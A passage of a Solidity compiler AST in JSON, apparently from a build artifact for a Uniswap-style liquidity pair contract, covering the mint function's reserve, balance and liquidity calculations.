										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1405,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 1543,
												"src": "5310:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1404,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5310:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5309:16:6"
									},
									"scope": 2224,
									"src": "5261:1265:6",
									"stateMutability": "nonpayable",
									"superFunction": 807,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1687,
										"nodeType": "Block",
										"src": "6704:1212:6",
										"statements": [
											{
												"assignments": [
													1553,
													1555,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1553,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "6715:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1552,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "6715:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1555,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "6734:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1554,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "6734:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1558,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1556,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1054,
														"src": "6757:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1557,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6757:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6714:56:6"
											},
											{
												"assignments": [
													1560
												],
												"declarations": [
													{
														"constant": false,
														"id": 1560,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "6795:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1559,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6795:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1569,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1566,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2386,
																	"src": "6844:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1565,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "6836:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1567,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6836:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1562,
																	"name": "token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 968,
																	"src": "6818:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1561,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "6811:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1563,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6811:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1564,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "6811:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1568,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6811:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6795:55:6"
											},
											{
												"assignments": [
													1571
												],
												"declarations": [
													{
														"constant": false,
														"id": 1571,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "6860:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1570,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6860:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1580,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1577,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2386,
																	"src": "6909:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2224",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1576,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "6901:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1578,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6901:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1573,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 970,
																	"src": "6883:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1572,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "6876:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1574,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6876:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1575,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "6876:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1579,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6876:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6860:55:6"
											},
											{
												"assignments": [
													1582
												],
												"declarations": [
													{
														"constant": false,
														"id": 1582,
														"name": "amount0",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "6925:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1581,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6925:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1587,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1585,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1553,
															"src": "6953:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1583,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1560,
															"src": "6940:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1584,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2270,
														"src": "6940:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1586,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6940:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6925:38:6"
											},
											{
												"assignments": [
													1589
												],
												"declarations": [
													{
														"constant": false,
														"id": 1589,
														"name": "amount1",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "6973:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1588,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6973:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1594,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1592,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1555,
															"src": "7001:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1590,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1571,
															"src": "6988:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1591,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2270,
														"src": "6988:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1593,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6988:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6973:38:6"
											},
											{
												"assignments": [
													1596
												],
												"declarations": [
													{
														"constant": false,
														"id": 1596,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "7022:10:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1595,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "7022:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1601,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1598,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1553,
															"src": "7044:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1599,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1555,
															"src": "7055:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1597,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1398,
														"src": "7035:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1600,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7035:30:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7022:43:6"
											},
											{
												"assignments": [
													1603
												],
												"declarations": [
													{
														"constant": false,
														"id": 1603,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1687,
														"src": "7075:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1602,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7075:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1605,
												"initialValue": {
													"argumentTypes": null,
													"id": 1604,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "7095:11:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7075:31:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1608,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1606,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1603,
														"src": "7198:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1607,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7214:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "7198:17:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 1648,
													"nodeType": "Block",
													"src": "7424:169:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1646,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1630,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1550,
																	"src": "7438:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1638,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1635,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1603,
																						"src": "7488:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1633,
																						"name": "amount0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1582,
																						"src": "7476:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1634,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2298,
																					"src": "7476:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1636,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "7476:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1637,
																				"name": "_reserve0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1553,
																				"src": "7504:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "7476:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1644,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1641,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1603,
																						"src": "7543:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1639,
																						"name": "amount1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1589,
																						"src": "7531:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1640,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2298,
																					"src": "7531:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1642,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "7531:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1643,
																				"name": "_reserve1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1555,
																				"src": "7559:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "7531:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 1631,
																			"name": "Math",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 928,
																			"src": "7450:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																				"typeString": "type(library Math)"
																			}
																		},
																		"id": 1632,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "min",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 873,
																		"src": "7450:8:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1645,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7450:132:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7438:144:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1647,
															"nodeType": "ExpressionStatement",
															"src": "7438:144:6"
														}
													]
												},
												"id": 1649,
												"nodeType": "IfStatement",
												"src": "7194:399:6",
												"trueBody": {
													"id": 1629,
													"nodeType": "Block",
													"src": "7217:201:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1620,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1609,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1550,
																	"src": "7231:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1618,
																			"name": "MINIMUM_LIQUIDITY",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 955,
																			"src": "7279:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1614,
																							"name": "amount1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1589,
																							"src": "7265:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"id": 1612,
																							"name": "amount0",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1582,
																							"src": "7253:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1613,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2298,
																						"src": "7253:11:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 1615,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "7253:20:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1610,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "7243:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1611,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "7243:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1616,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "7243:31:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1617,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2270,
